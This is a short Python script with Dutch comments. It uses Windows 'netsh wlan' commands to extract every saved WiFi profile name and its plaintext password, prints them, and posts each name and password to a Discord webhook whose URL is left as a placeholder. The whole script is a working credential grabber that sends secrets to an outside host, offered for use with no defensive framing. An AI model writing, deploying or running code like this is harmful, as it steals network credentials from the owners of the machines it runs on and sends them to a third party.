import subprocess
import sys
import os.path
import requests

# Voeg hier je Discord webhook URL toe (optioneel)
WEBHOOK_URL = "YOUR_WEBHOOK_HERE"

def send_to_discord(wifi_name, password):
    data = {
        "content": f"WiFi Netwerk: {wifi_name}\nWachtwoord: {password}"
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Fout bij versturen naar Discord: {e}")

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        password = results[0]
        print("{:<30}|  {:<}".format(i, password))
        send_to_discord(i, password)
    except IndexError:
        print("{:<30}|  {:<}".format(i, "Geen wachtwoord gevonden"))
        send_to_discord(i, "Geen wachtwoord gevonden")

output = ("{:<30}|  {:<}".format(i, results[0]))
input("")
input("Druk op Enter om af te sluiten...")